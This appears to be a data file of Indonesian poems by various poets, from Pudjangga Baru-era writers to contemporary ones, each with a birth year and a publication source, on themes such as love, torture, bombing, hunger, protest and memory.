        "Arian Pangestu (l. 1991)\nPagi yang Ramah\n\nAku tak dapat membedakan pagi yang ramah atau awan yang marah\ndi atas sana langit begitu sengit menabur hujan menahan langkah kakiku\ndi kota yang rusuh ini, kembali aku dan kau sekali lagi gagal bertukar\nciuman yang sudah berminggu-minggu tertahan dan terasingkan.\nAku tak dapat menerjemahkan pagi yang ramah dan hati yang marah\nmemendam seribu kecewa yang dihanyutkan pada banjir di jalan raya\nsebelum pesan darurat seperti SOS yang dikirim udara kubaca,\n“Sayang sepertinya bibirku belum bertakdir untuk kaurengkuh hari ini,\ntapi aku berjanji bulan depan bibirku tetap merah membara menyala\nsiap untuk membakar bibirmu yang kemarau itu.”\n\n\n\nSumber: Minggu Pagi, 10 April 2017\n\n\n\n",
        "Saut Situmorang (l. 1966)\nAnatomi Penyiksaan\n\nmata\njangan kau menangis\nwalau tak henti sepatu sepatu tentara itu\nmenghajar dada.\n\nmulut\njangan kau mengeluh\nwalau terbakar kulit daging\ndisundut rokok rokok itu.\n\nkaki\njangan kau goyah\nwalau berjam jam kau berdiri\nmenahanku terpaksa.\n\nperut\nbertahanlah.\nrasa mual yang amis itu\ncuma listrik menggigit darah.\n\nah, dada yang malang\njantungmu sudah tak tahan\nhampir pecah.\ntegarlah, tegarlah\njangan kau sampai berkhianat\n\nitu yang diinginkan mereka!\n\nSumber: Boemipoetra, 8 September 2019.\n\n",
        "Djoko Saryono (l. 1962)\nPengakuan Prabangkara, 2\n\ndalam gemetar nada disabot jagat raya\ndalam getar gemeretak suara dia berkata\n\ncuma tetesan tinta, baginda\nsungguh, hanya cairan isi pena\ntiada sengaja luruh menimpa\ntubuh sempurna isteri paduka\nseusai tersalim di kanvas kasa\nkenapa hamba dibanjiri purba sangka?\nkenapa paduka menghunjamkan nista?\n\ncuma tetesan tinta, bukan cinta\nhanya cairan isi pena, tak asmara\nbenar, sekadar tinta di ujung pena\nyang lunglai lalu menitik di pusat kama\nserupa tahi lalat yang permaisuri punya\nakibat konsentrasi hamba luar biasa\nkenapa paduka harus membabi buta?\nsungguh, sirna kebajikan penguasa!\n\njagat raya bersemedi begitu paripurna\ndiam-diam mencatat semua angkara\n\nSumber: Arung Cinta (Pelangi Sastra, Malang, Bekerjasama dengan Kafe Pustaka\nMalang dan Perpustakaan Pusat Universitas Negeri Malang, 2015)\n\n",
        "Nurhayat Arif Permana (l.1969)\nMembaca Masa Lalu\n\n“Aku sudah melepaskanmu, dayang,”\nkatanya ketika membaca Skenario tebal\nsehabis merapikan Nostradamus.\nTampaknya dia kehabisan daya setelah\nbergumul dengan sejumlah kesengsaraan.\nHari ini adalah hari menjelajah kembali\njalanan kemarin. Ada yang ingin diubahnya\nmalam berkabut penuh angin serta pikiran\namat lelah.\n\nEngkau barangkali juga berkemas membuang\nserpihan demi serpihan kegelisahan dan\nakal sehat. Pantai ataukah daun-daun cemara\nitukah yang tengah mengusik masa lalunya.\n“aku telah berganti rupa sejak kubaca\nkembali sajak-sajak dari rahimmu,”\ndia meyakinkan jemarinya yang terus-menerus\ngemetar bila membayangkan helai rambut\nberjatuhan.\n\n“Masa lalu itu,” barangkali\nNostradamus yang membisikinya,\n“apakah senantiasa berulang\ndan menciptakan ketakutan baru?”\n\nPalembang, 11/2001\n\n\n\nSumber: Stanza Lara (Ladang Pustaka, Yogyakarta; 2011)\n\n\n\n",
        "Doddi Ahmad Fauji (l.1970)\n\nPUISI TENTANG PUISI JATUH CINTA\n Kepada Litaniar Qonakis Iskandar\n\nDan aku suka kau menyelaku\npikiran-mu lebih bijaksana dari Pancasila\ntapi lebih bengal dari anak-anak liar \nyang bangga dengan ketidakmandiannya\n\nAku berlatih bijak sekaligus liar\nmaka kuabadikan sungai Tigris\nyang mengantarkan kejayaan Babylonia\nkulestarikan laut merah\nyang menenggelamkan Firaun\nkupersembahkan hanya untuk-mu\nmelalui ciuman mautku\n\nLangit runtuh dan laut terbakar\noleh ciumanku, dan musuh-musuhku\nakan mampus bersama laut yang hangus\nterkubur dalam reruntuhan langit\ntentu sangat lucu dan betapa bodoh\nbila dalam puisiku saja aku terkalahkan\ndalam puisiku, akulah raja terkuat\ndan kau permaisuri-nya\n\nBandung, 2015 \n\nSumber: Lampung Post, Minggu, 22 Februari 2015 \n\n",
        "Sukardhi Wahyudi (l. 1960)\nSang Tokoh\n\nKau kah lelaki penghuni rimba\nmenjaga damar dan rotan\ndari jamahan sang dalang petualang\nmengisap sari pati\nmeraba paksa keperawanan belantara\nmeninggalkan koyakan pilu dan luka menganga\npedih berkepanjangan\nmembuat tak ada ringkik dan tawa satwa.\n\nKau kah lelaki penjaga taman\nyang tak pernah keluh kesah pada segala musim\nmembuat tandus dan gembur menjadi satu warna\ntak ada gelisah\nresah\nsebab kau sendiri tumbuh menjadi bunga sejati\nyang tak pernah layu dalam sanubari.\n\nKau kah lelaki penghuni sungai\nnadi yang mengalir sepanjang perburuan\nmeliuk lekuk di setiap mata suara\ndan mengantar sampan pada tujuan.\n\nKau kah lelaki penjaga cinta\npada rongga-rongga dada yang menyapa\nmemberi satu nama yang namanya arah\nbiar langkah menyusuri jejak tak salah\nmenyebar benih mesra pada semesta.\n\nKau kah lelaki penghuni rimba.\nKau kah lelaki penjaga taman.\nKau kah lelaki penghuni sungai.\nKau kau lelaki penjaga cinta.\nKau kah orangnya.\n\n*** Kukar, 081106\n\nSumber: Lelaki Itu (Araskan Publisher, Yogyakarta, 2010)\n\n",
        "Ng. Lilis Suryani (l. 1996)\nKalimat Lapar Bahasa Rempah\n\nI\nDi balik rak yang gelap ini\nPiring dan gelas mematung menanti isi\nTungku redup malu-malu\nApi tak cukup menyala dari dada\n\nAh, singkong yang tega\nTak satupun mencuat mengganjal perut\nAh, tanaman sayur yang sakit\nMengapa manja menunggu hujan tiba\nAh, tudung yang murung\nDengan lagu kosong apa lagi\nKutimang anak-anakku\nDan tanah air bagi kami\nIalah tempat menahan lapar\n\nII\nSuatu hari wajahmu riang mengiris bawang\nBiji ketubar berlari-lari\nLada yang nakal berseteru dengan cabai\nSemoga kau senantiasa sabar\nMenerjemahkan aroma ke rasa lapar\n\nGula menggoda garam yang diam\nKunyit yang kau kupas\nMenyususp ke serat serai yang tegas\nMeski tak memahami bahasa rempah\nKau tahu bahwa bumbu\nTidak meresap ke batu-batu\n\nYogyakarta, 2018-2019\n\nSumber: Lahir Sajak, 15 Juli 2019\n\n",
        "Ook Nugroho (l. 1960)\nJumat\n\nBagimu semua sudah lalu \nBagiku semua terasa baru \nHari Jumat selalu datang lagi \nJam tujuh pagi bom itu meledak lagi \n\nBagimu semua sudah usai \nBagiku semua baru saja mulai \nJumat pagi selalu kembali lagi \nSuamiku yang mati kembali mati \n\n2009\n\nSumber: Tanda-tanda yang Bimbang (Kiblat Buku Utama, Bandung, 2013).\n\n\n\n\n",
        "Ng. Lilis Suryani (l. 1996)\nKalimat Lapar Bahasa Rempah\n\nI\nDi balik rak yang gelap ini\nPiring dan gelas mematung menanti isi\nTungku redup malu-malu\nApi tak cukup menyala dari dada\n\nAh, singkong yang tega\nTak satupun mencuat mengganjal perut\nAh, tanaman sayur yang sakit\nMengapa manja menunggu hujan tiba\nAh, tudung yang murung\nDengan lagu kosong apa lagi\nKutimang anak-anakku\nDan tanah air bagi kami\nIalah tempat menahan lapar\n\nII\nSuatu hari wajahmu riang mengiris bawang\nBiji ketubar berlari-lari\nLada yang nakal berseteru dengan cabai\nSemoga kau senantiasa sabar\nMenerjemahkan aroma ke rasa lapar\n\nGula menggoda garam yang diam\nKunyit yang kau kupas\nMenyususp ke serat serai yang tegas\nMeski tak memahami bahasa rempah\nKau tahu bahwa bumbu\nTidak meresap ke batu-batu\n\nYogyakarta, 2018-2019\n\nSumber: Lahir Sajak, 15 Juli 2019\n\n",
        "S.M. Ardan (1932-2006)\nPerjalanan\n\nAku salah satu penumpang kereta-api dari dan ke satu jurusan\nSeperti juga yang lain: bermata sangsi, belum punya pegangan\nBerasak-asakan, duduk diikat benda mati, gantungan harap\nMelihat ke luar jendela, melupa, kepadatan, perpacuan\nBeriri pada manusia-manusia berkeliaran di keluasan\nKereta-api berlari, penumpangnya bertanya:\nDi mana aku mesti turun, hei, kawan?\nDisambut teduh atau disongsong panas?\n– kawan di sebelahku ini tak mengerti kataku –\n\nSumber: Majalah Pudjangga Baru, Nomor 8 Tahun XII, Pebruari 1951 \n\n",
        "Refdinal Muzan (l. 1966)\nMistis\n\nEngkau membawaku dalam langkah kanak yang kosong\nKesiur angin malam, rimba semak belukar\nTemaram separuh bulan\nnyanyian jangkrik dan kunang-kunang\nKembang harum setanggi,sepercik darah, sesayat merpati\nKerajaan kampung si bunian, hulu kelam pekat muara sungai\nGelepar si buaya putih,penunggu siriak-riak ombak\nPucuk menjulai sibuah rengas, kau layari tongkang\ndi Kuali dalam\nInilah negeri sang hulubalang, rentak gemulai\nliuk zapin berdendang\nMeningkah mistis senyum sudut kerlingan mata\nOh, Rabina, hamparan tandus jiwa di setiap\nkecipak mantera sang pendawa\nTelah kugali-gali linggis hati\ndi bilik-bilik sunyi\nTak ada lampu,sepi memagut bersama derai-derai pucuk para\nBeku batu-batu nisan, kupagut purnama memancar\ntergeletak di rimbun kuning kering dedaunan\ngugur di pelukan tanah\ngores memijak langkah\nperlahan terjaga dari kemilau caya\ndi ranting-ranting selah\n\n\n\nSumber: Mozaik Matahari (FAM Publising, Kediri-Jawa Timur, 2012)\n\n\n\n",
        "Seno Joko Suyono (l. 1970)\n\nJam Malam\n\nAku periksa lagi kalimat yang akan kukirim kepadamu\nHanya beberapa kata kerja yang kumengerti\nSemuanya tak ada yang menjurus ke situasi yang kuinginkan\nKalimatku timpang konjugasi\nKoyak sana koyak sini paragrafnya\n\nJalanan ke zona perdamaian senyap benar\nKarung-karung goni berpasir ditumpuk menutup lorong\nKawat berduri dibentangkan barikade\nRanjau-ranjau ditebar di radius batas\nSirene mati. Ambulans hilang\n\nKucari padanan kata perlindungan pada kamus\nKucari terjemahan kata tunduk\nKugapai-gapai sinonim kata pertolongan\nAku ingin merangkai sebuah kalimat menggambarkan situasi sulit\nSituasi yang meminta penyembuhan dan syafaat\nBukan hanya kasus akusatif dan datif yang kuperlukan\n\nAlamat tujuanku berada dalam bungker langit\nIa tak terdeteksi radar\nIa semestinya bisa berbicara dalam bahasa apa pun\nTermasuk surat tanpa tata dan vokabuler yang tepat\n\nAmplop dan kertasku kelabu\nTintanya masih basah. Berwarna biru keemasan\nDengan alamat yang lembut\nSemoga semua tak mustahil\n\nTanpa kata kerja yang lengkap. Tanpa tanda baca yang genap.\nTanpa tanda waktu. Tanpa kurir dan mata-mata berpengalaman\nPermohonan minta tolongku selamat menyusuri jam malam\n\nSumber: Kompas, 9 Juni 2018\n\n",
        "Raedu Basha(l. 1988)\nMayat Sepi\n\n1\naku bukan dia yang mati di dalam pembakaran\ntapi aku mayat di dalam sepi\n\nmenanggung berat kesunyian\ndan pahala pada sebuah diam\n\njika waktu terlalu silau memandang rembulan\nmaka bacalah deritaku di antara lubang dada\nhuruf-huruf tereja bersama\nnyanyian jantung rentap\n\n2\naku bukan dia yang mati membawa api\ntapi aku mayat di dalam janji\nyang disulut matahari\nmenggantung mimpi\ndi dalam langit pikiran\n\njika ruang terlalu sempit buat menumpahkan isi hati\nmaka keluarlah dari angan\nkepada harapan demi harapan\nsampai kata-kata akan tersemat kala senja\nterlalu berat untuk tenggelam\n\n\n\nSumber: Kedaulatan Rakyat, 26 April 2015.\n\n\n\n\n\n",
        "Sandro Soge Making (l. 1999)\nNomor Telepon\n\nI\nDEA: 082236375759\n\nII\nSebelum memanggilmu dengan nama seharusnya\nTelepon adalah ingatan yang meributkan kepala\n\nIII\nDan jadilah, sebuah jarak seperti catatan angka-angka\nSelain beberapa kali menghitung panggilan dan namamu\nSemakin gemar dijumlahkan.\n\n2019.\n\nSumber: Halaman Sembilan, 20 Maret 2020.\n\n\n\n",
        "Amarzan Ismail Hamid (l. 1941)\nSahabat\n\nTentang GM\n\nsetelah selang sehari\nburung-burung pun terbang\nmencari sarang – di negeri yang hilang\nkita tak pernah sungguh-sungguh pulang\n– tak pernah\ndari berbenah ke berbenah\ntangan yang menulis tak kunjung sudah\nhingga lampu padam\nkota kehilangan arah\nengkau memberi tanda pada peta\ntapi laut itu telah lama lupa\npada bintang dan mata angin\ndan merpati yang kita lepas\nmencari Sokotra\ntersesat di ufuk tiada.\n\n\n\nTentang WP\n\nmenyeberangi alun-alun kota\nangin menyesah dukamu yang basah\nbetapa panjang sesal\nantara rantau dan kampung halaman\nburung-burung gagak dari utara\ntelah tiba dinihari tadi\nmenatap sabar lampu kota yang lindap\nmenjelang senja\nsesungguhnya kita tidak di sini – katamu\ntetapi di Katwijk, pesisir tempat nelayan\nmembongkar kapal\ndan iman yang kekal.\n\n\n\nTentang Wiratmadinata\n\nlepas selasar terbuka\ntujuh langkah ke arah pukul satu\nmakam kecil itu selalu memanggilku:\nYahwa, bila lagi datang bertamu?\ntanah menjadi sangat basah – pagi itu\nlorong-lorong menyesatkan arah\nmenyembunyikan rumahmu\ndi balik rimbun perdu\nlangit yang rindu\nhingga tiba malam\ndalam kelebat kelam.\n\n\n\nTentang OS\n\nberdiri di balkon hotel kuna itu\nmenatap Sanur\nlaut malah tampak kelabu\nmatamu menyapu lazuardi yang biru\npuisi itu telah lama meninggalkan kita\n– lama sekali\nsebelum terbit matahari\nmalam belum lama lewat\ntinggal bayang resam tubuhmu\nseolah tak sudah\ndi ranjang berkarat.\n\n\n\nTentang Diro\n\nteringat engkau teringat Sanleko\nlaut nirmala Jikumerasa\nteringat ladang-ladang sagu\nnegeri kayu putih\nteringat engkau teringat air mata\nusia yang terkikis\nbelantara bencana\nmalam yang gigil\namarah hutan dam semayam dendam\nsumpahmu di sana terekam.\n\n\n\nTentang Zubir\n\nsemoga engkau tak pernah ke sini, katanya\nsemoga kita tak berjumpa di sini\ndi Kalisosok yang indah\npenuh kenangan haram jadah\nia pun mati perlahan-lahan\ndalam pangkuan kelaparan\ndan sepucuk pesan:\nZan, cari anakku kapan-kapan.\n\n\n\nTentang El\n\ndi tepi hutan suaka ini\nhanya kita berdua\nsebatang sungai tak berhulu\ntak berkuala\nsipongang rimba\nbagai pekik jembalang\nmerayakan dendam\nanak menjangan yang tertikam\ntetapi sejarah tak pernah berulang\ndi tepi hutan suaka ini\nseperti dahulu\nlama hanian.\n\nCikarang, 2015\n\nSumber: Kompas, Minggu 16 Agustus 2015\n\n\n\n\n\n",
        "Hr. Bandaharo (1917-1993)\nMetropolis (1978), X\n\nUntuk Joshi Hota\n\nHanya kemenangan, percayalah, hanya kemenangan\nmampu mendukung kebenaran dan keadilan.\nBukan kejujuran. Kejujuran ada di hati penyair\nyang memendam cita-cita dan harapan –\npada hakikatnya itu pun hanya ilusi.\nKoruptor jadi penyelamat\nkarena dia membawa bunga dan madu. Dan nasi\nyang harum, tidak bau keringat.\nPenyair jadi teroris\nkarena dia melemparkan sajak. Dan nyanyi\nhatinya yang tersayat, teriris.\n\nHidup ini akhirnya hanya mimpi. Mimpi\nyang indah maupun yang ngeri.\nMati berarti bangun tersentak. Dan menyadari:\nsekarang baru kehidupan akan dimulai.\n\nJakarta metropolis, sorga dan neraka\ndalam mimpi. Hanya mimpi.\nMaka istigfarlah, wahai penyair,\ndan berdoa dalam hati\n\nYa, dalam hati saja\n\nSumber: Metropolis (1978) dari Aku Hadir di Hari Ini (Ultimus, Bandung; Cet. I,\n2010)\n\n",
        "Yopi Setia Umbara (l. 1984)\nDalam Sebuah Flat\n\ndalam sebuah flat di lantai 16\naku terkurung sangat kesepian\nperadaban jadi sekadar berita\nsekilas kubaca di dunia maya\natau gemuruh kendaraan\njuga suara orang-orang\nmelambung memenuhi udara\n\ndi dalam flat sesak gerah ini\naku berusaha terus menulis\nmencoba mempertahankan hidup\ndengan menjadikan puisi\nsebagai nafas yang masih kuhirup\nsebab waktu diam-diam merampok\nsegala keliaran dari diriku\n\n2013\n\nSumber: opopet.blogspot.com\n\n",
        "Faisal Kamandobat (l. 1980)\nMysterium Tremendum Et Fascinans\n\nsegalanya telah terungkap\nwalau kita tertahan kebisuan\nmatamu mengatakan segalanya\nlebih dalam dari bayang-bayang\nyang menampilkan cahaya\n\ntak perlu darah menjadi luka\ntak perlu bunga dibebani makna\nkau dan aku sepasang isyarat\nyang menjalin ada dan ketiadaan\ndalam hasrat penghabisan\n\nwaktu kehilangan jejaknya\nruang tak dapat memutuskan\ndi mana kita berada: pertemuan ini\nmemusnahkan kau dan aku\ndalam pengalaman di seberang dunia\n\n2004\n\nSumber: Alangkah Tolol Patung Ini (Olongia, Yogyakarta, Agustus 2007) \n\n\n\n\n\n",
        "Hanna Fransisca (l. 1979)\n\nMusyawarah Katak\n\n1.\n\nNyanyi sore\ndi kolam kita,\nbiar hujn tak lekas reda.\n\nPutik belimbing daun talas\nkamboja kuning\nmekar serentak.\n\n2.\nGurih udara milik siapa:\nkita bernyanyi,\nuntuk apa?\n\n“Kita bernyanyi untuk semesta.”\n\n“Kita bernyanyi \nuntuk manusia.”\n\nBukan. Bukan buat manusia.\nMereka tak akan mampu mendengar\nsuara. Mereka tak bisa mengintip sunyi.\nyang menumbuhkan biji\ndi subuh hari.\n\n“Tapi mereka punya Tuhan.”\n\n“Tapi mereka juga membakar pendosa,\nyang berdoa di rumah ibadah.”\n\n3.\nSore bahagia,\nranting dan pohonan\nmendengar suara.\n\nDi pojok kebun kolam kita:\nTuhan tersenyum\nduduk di sana.\n\nJakarta, 2017\n\nSumber: Hari Raya Puisi (Yayasan Hari Puisi, 2018)\n\n",
        "Dodong Djiwapradja (1928-2009)\nGarut\n\n——kepada Madro’i (pembajak)\n\nDesa dikenang desa terbayang\nAh, kali yang memanggil mati\nKiranya hijau menjadi merah\nApi menjilat membakar rumah.\n\nDesa dikenang desa terbayang\nAh, kali yang memanggil mati\nDi bukit-bukit ajal bersarang\nMaut mengintip maut menanti.\n\n Desa dikenang desa terbayang\nAh, kali yang memanggil mati\nDi jalan kekota petani berpesan\nPadi menguning jeruk menjadi.\nDesa dikenang kenanglah, sayang!\nLangit mendung didukung gunung\nSetiba angin mendaki tebing\nHujan tumpah tak terkira\n~dan di sini mereka berkampung\nDesa dikenang kenanglah, sayang!\nPagi tiba sampai di kota.\n\nDesa dikenang desa terbayang\nAh, kali yang memanggil mati\nPanen terakhir nyawa penghabisan\nSawah dan ladang sepi menanti.\n\n\n\n\n\n",
        "Diah Hadaning (l. 1940)\nPohon-pohon Sisa Peradaban\n\npohon-pohon sisa peradaban\nberebut lahan di hatimu\ntumbuh dan tumbang\ntanpa sentuhan angin\nranggas dan semi\ntanpa suara burung pagi\npohon-pohon sisa peradaban\nsebuah tangis sepi setiap subuh bangkit\nrantingnya menerpa-nerpa dada\nyang kerap alpa menyapa Tuhannya\nseorang pelukis tanpa nama kaulah itu\nmengabadikannya atas kanvasmu\nsetelah mengeluarkannya dari dadamu\npada hembusan napas terakhir\npohon-pohon sisa peradaban\ntumbuh dalam dada dan kemungkinan\n\n1994\n\nSumber: Sembilan Kerlip Cermin – Antolgi Puisi Sembilan Penyair (Pustaka Jaya,\nJakarta, 2000)\n\n",
        "Adri Darmadji Woko (l. 1951)\nLembah\n\nCoba dengar siapa yang memetik gitar di lembah\nsiapa yang memainkan gondang batak\nsiapa yang memainkan kecapi sunda\nsiapa yang memainkan seruling\nsiapa yang memainkan kolintang\nsiapa yang menabuh gamelan\nsiapa yang memainkan tifa\nmungkin tiada ada apa-apa\nnamun bunyi gemuruh terdengar di sana\nantara curam dan langit memudar\n\nSiapa yang menanyakan suara-suara itu\ndatang dan pergi begitu riuh rendah?\n\nTak seorang pun tahu\nsang pemain lagi tiduran di lembah itu\nmenyatu dengan tanah gembur\nakar rumput yang kuat\n\nDia tak mendengar pertanyaan itu\nhanya mengabdikan diri dan mau dibilang ingin menjadi lembah\nagar kita dapat melewatinya\ndan merasakan betapa ditinggikan\n\nHe, siapa yang bermusik itu?\nSiapa yang berada di lembah itu?\n\nSUMBER: SANGHYANG JARAN (KOSA KATA KITA, JAKARTA, 2017)\n\n\n\n\n",
        "Indrian Koto (l. 1983)\nPerjumpaan\n\nkami berfoto di teras rumah setengah kayu setengah tembok\nyang dibangun saudara ayah yang tak kupaham betul jalur silsilahnya\ndi belakang rumah, sungai besar menghantam batu\nlubuk beriak di bawah jembatan kawat milik peladang dan kampung seberang.\n\nnenek, masih dengan senyum yang sama saat bertahun lalu kutemui\nkerabat ayah yang belum kupaham alur jalinnya\njalanan masih batu dan berlumpur ketika hujan\ndalam rumbunan bukit barisan\n\nperempuan yang kupanggil kakak dengan senyum pahit bercerita\nanak tertuanya baru meninggal dari perantauan dan meninggalkan\nseorang cucu untuknya\nsementara bangku ini masih yang lama, angin yang sama, tikar yang sama\nsejak kedatanganku terakhir kali\n\ndi kampung asal ayahku\ndi antara kerabat yang berhati hangat di musim hujan\nkami bercakap tentang yang lampau tentang yang jauh\nbahwa hampir tak ada yang berubah selain usia\nbahwa mereka lebih hapal negeri tetangga\ndibanding ibu kota negeri sendiri\n\nkami berfoto bersama, yang tersisa\ndari seluruh garis leluhur yang tak penting untuk diurai\ntak akan ada potret keluarga yang lengkap\nsebab kami telah menjelma dengan silsilah yang sama rumitnya\n\nkami berfoto, sebagai kenangan yang tak selalu bisa diulang\n\n2018\n\nSumber: Kompas, 2 Maret 2019.\n\n",
        "Oppa Rudi Fofid (l. 1964)\nNakaela\n\nNakaela, tubuhmu yang pualam\nAdalah tubuh ina jua\nTinggalong-tinggalong mencintaimu\nKalong-kalong merayumu\nUntuk satu percintaan berdarah\n\nNakaela, andai kau perawan terakhir\nMaukah kau serahkan badan\nKepada tinggalong dan kalong?\nAtaukah kau tetap saja kukuh\nSebagai perempuan pamali?\n\nNakaela, jika tubuhmu disentuh\nPatahkan gigi besi sekalipun baja\nLemparkan bebek buldozer ke udara\nGantung di awan hitam\nSampai lehernya patah\n\nNakaela, nyanyikan lagumu yang kapata\nPanggil moyang-moyangmu yang luhur\nMenjaga kulitmu, tulangmu yang bunda\nSiapa culas kepada anak-cucu\nKutuk dia jadi tikus mondo\n\nAmbon, 27 Oktober 2020\n\nSumber: Poros Timur, 8 November 2020.\n\n\n\n",
        "Husain Landitjing (l. 1938)\nMalino dalam Senja\n\ndentang hidup sayup bergema lewat hari-hari dalam senja\nsementara kota dingin ini menonjol di lintasan\nkabut putih saling bergulat di pucuk-pucuk pohonan\ndan semak-semak menghilang;\ntatkala arus angina bangkit kembali\nkabut putih, hantu-hantu serta roh-roh dihalau bengis\nke jurang ternganga di bawah, dan —\ndi atas gunung saling pukul memukul danberombak dalam suara\n\nkemudian haripun letih sendiri, lalu,\nmenyerah,\nmengendap di padang rumput basah\ndan sepi merangkak perlahan-lahan\nmenusuk indra,\nmengganggu sampai malam jatuh di ranjang penginapan;\n\nmendadak kawanku bertanya;\napa yang bisa dibuat dengan sunyi?\nmibum anggur garang?\nmengepulkan mimpi ke dunia lain?\natau bercerita akan hal ihwal perempuan tak habis-habisnya?\natau tentang kesusasteraan Indonesia abad dua puluh?\natau sifat-sifat Tuhan?\natau hal mati?\n\nah, jangan, jangan dengan hal mati\naku takut maut tiba-tiba bangkit bagai dinding\natau menyamar dalam sepi\nlalu menangkap dengan garang\nmaka kita takkan bisa lagi kembali\nke rumah asal\nbuat menyalakan api\nyang kekal;\n\nsebab, sungguhpun duka demikian berat dan memuncak\nmenggelegak,\ndi hari-hari dalam senja\naku masih tetap rela bangkit dan akan bertarung kembali\ndari kejatuhanku yang kedua\naku akan bertarung lagi,\nsampai kapan?\nsekarang ini aku belum bisa mengatakan\n\nSumber: Horison No.3, Thn. 5, Maret 1970.\n\n\n\n\n\n",
        "Mohammad Ali Tsabit\n\nHikayat Sapu Lidi\n\nSampai kata-kata ini telah mencapai puisi\nkami masih tak mengerti mengapa kami\ndengan seutas tali\n\nPagi sekali kami masih asyik\nmenggiring daun-daun kering\ndari pinggir jalan ke pembuangan\ndari halaman ke pembakaran\n\nmenyaksikan gumpalan asap yang adalah ruh dedaunan\nmengepul-terbentang-berangkat ke awan\nHati kami teramat senang memeluk sepi di pojok bangunan\n\nBegitu kami menjalani hidup saban hari\nHinggga akhirnya tak sanggup menujum\nyang dirindukan tanah\n\nketika api menjalar ke tubuh kami\n\nKutub/Yogyakarta, 2015\n\nSumber: Agitasi Pada Sebuah Pagi (2019, Penerbit Kutub)\n\n",
        "Rusli A. Malem (l. 1942)\nBianglala\n\nGerimis dan mentari\nSaling berbagi duka\nMendung dan langit\nTerkulai dalam warna\n\nDedaunan dan rintik air\nMengisahkan kembali dongeng-dongeng masa kecil\nTentang seribu hantu\nYang menguras sebuah kolam\nMemahami ikan badu\nDengan taring-taringnya yang tajam\n\nHantu itu merajai udara\nMambangnya terpampang dalam\nTujuh cahya pelanginya\nPantang ditunjuk\nDengan telunjuk kita\nPantang ditanya\nDari manakah gerangan datangnya?\n\n1968\n\nSumber: Sastra, N. 5, Thn VII, Mei 1969, lewat Tonggak 3 (Gramedia, 1987)\n\n",
        "S. Rukiah (1927-1996)\nPohon Sunyi\n\nEngkau sudah tua\nakarmu rapuh dengan tanah berpegangan\nsebagian sudah lepas\nputus berpisahan\ndan pasir sebutir demi sebutir\nngeri ia berjatuhan!\n\nBatu-batu\ndekatmu diam membisu\ndaun kering mulai bercerai pergi\ndan jatuh di sungai\ntenggelam di arus mati.\n\nAkar itu satu-satu\ndaun setangkai-setangkai\nputus semua\ndan gugur ke dasar mencari\nhidup semula\ntinggal pohon yang rapuh\nmemandang jurang\nsunyi menanti.\n\nKapan lagi engkau ini\nmesti pergi\ndan apa yang akan datang?\n\nSumber: Pudjangga Baru, No. 10-11, Tahun IX, April Mei 1948 via via “Seserpih\nPinang Sepucuk Sirih (Pustaka Jaya, Jakarta, 1979)\n\n\n\n\n\n",
        "Rahmat Jabaril (l. 1968)\nDi Sebuah Barak\n\nBulan di malam\nserahkan kamarku\ntembus jendela\njelajah dunia\n\nSudah empat nyawa\nditembus api panas\nlara menikam tubuh\ntelanjang para demonstran\n\nKawan-kawanku\ntertidur merana\nkeramaian di barak\npenjara sepi mati\nkawan terbaring\ndihunus harapan\nkaum jelata!\n\n13 Mei 1998\n\nSumber: Patah (Ultimus, Bandung, 2008)\n\n\n\n",
        "Goenawan Mohamad (l. 1941)\nDi Beranda Ini Angin Tak Kedengaran Lagi\n\nDi beranda ini angin tak kedengaran lagi\nLangit terlepas. Ruang menunggu malam hari\nKau berkata: pergilah sebelum malam tiba\nKudengar angin mendesak ke arah kita\n\nDi piano bernyanyi baris dari Rubayyat\nDi luar detik dan kereta telah berangkat\nSebelum bait pertama. Sebelum selesai kata\nSebelum hari tahu ke mana lagi akan tiba\n\nAku pun tahu: sepi kita semula\nbersiap kecewa, bersedih tanpa kata-kata\nPohon-pohon pun berbagi dingin di luar jendela\nmengekalkan yang esok mungkin tak ada\n\n1966\n\nSumber: Asmaradana ( Gramedia Widiasarana, Jakarta, 1992)\n\n",
        "Doddi Ahmad Fauji (l. 1970)\n\nJAMPANG KULON \n1\nPerang di Utara\ntak teramal dalam siasat\nbadai salju mengamuk\nkami terdesak\n\nAku tak bisa\nmenghubungi-mu lagi\n\nIzrail gentayangan\npada hari ke-900\ndi kota yang kami kepung\nnamun pedang mautnya\nberkedip ke legam jantung kami\n\nLangit sesak gejolak\nseperti pertapa yang terusik\n\nSungguh tangguh Beruang Kutub\nberbaret merah darah, merah kematian\ndengusnya lebih dingin dari El Nino\narwahnya direndam\ndi Selat Siberia\n\nAku memang\ntak terbunuh\ntapi sudah ku katakan\naku tak bisa menghubungi-mu lagi\n\n2\nIni subuh pertama di Jampang Kulon\njejak hujan tertahan di langit\nseperti cipratan cat\ndari kuas pelukis ekspresionis\ntanpa semburat fajar\nlangit menutup diri\nbahkan untuk doa berkelana\n\nTerang tanah perlahan bangkit\ngugus kabut dan awan bakal hujan\nmencipta bayangan\nsial sungguh\nkarena masih juga\nwajah apel-mu\nseakan seringai wali kota\nmenertawakan penyair\nrasul yang dikira kalah itu\n\n3\nRasul atau penyair\ntak pernah kalah\nwalau sering dikira\nmudah menyerah\n\n4\nAku berkelana lagi\nseturut takdir memandu\ntahun baruku terdampar\ndi pantai-pantai bernyanyi\n\nDi tanah para jawara\naku melapas kata\nmenjelma cahaya\nyang selalu tahu\ncara menahan kegelapan\ndan sudah kukatakan\naku tak bisa menghubungi-mu lagi\n\nDi tanah para jawara\naku menerima perjanjian\nyang tersisa\ndan yang bakal terentang\nbukan milikku\n\nSepenggal daulat\nsebutir takdir\nmelesat bersama langkahku\nsebermula selalu kata\n\nSukabumi, 2016\n\nSumber: Media Indonesi, 15 Mei 2016.\n\n",
        "Irvan Syahril (l. 1997)\nSebelum Meninggalkan Banda Neira\n\nKabar dari lembar koran dan radio di penginapan\nadalah pengumuman, adalah sinyal penjemputan,\naku melihatmu berkemas dengan Beethoven yang menyala.\n\nBom meledak, Pearl Harbour runtuh, dan Ambon\nyang terkepung seluruh penjuru, seperti piringan hitam yang\nberputar dalam kepalamu. Seperti suara malam yang utuh.\n\nAku akan kehilangan riuh di bibir pantai, ketika kau\nmengajarkan lagu kebangsaan, sekeras-kerasnya, sampai\nujung laut itu menyatakan kibar bendera kemerdekaan.\n\nDan pada suatu waktu, malam menculikmu dari penginapan.\nMalam dengan gema pesawat terbang. Sejak itu, aku belajar\nmengulang lirik lagu itu dengan ketulusan dan kebebasan.\n\n2018\n\nSumber: buruan.co, 30 Januari 2020\n\n\n\n",
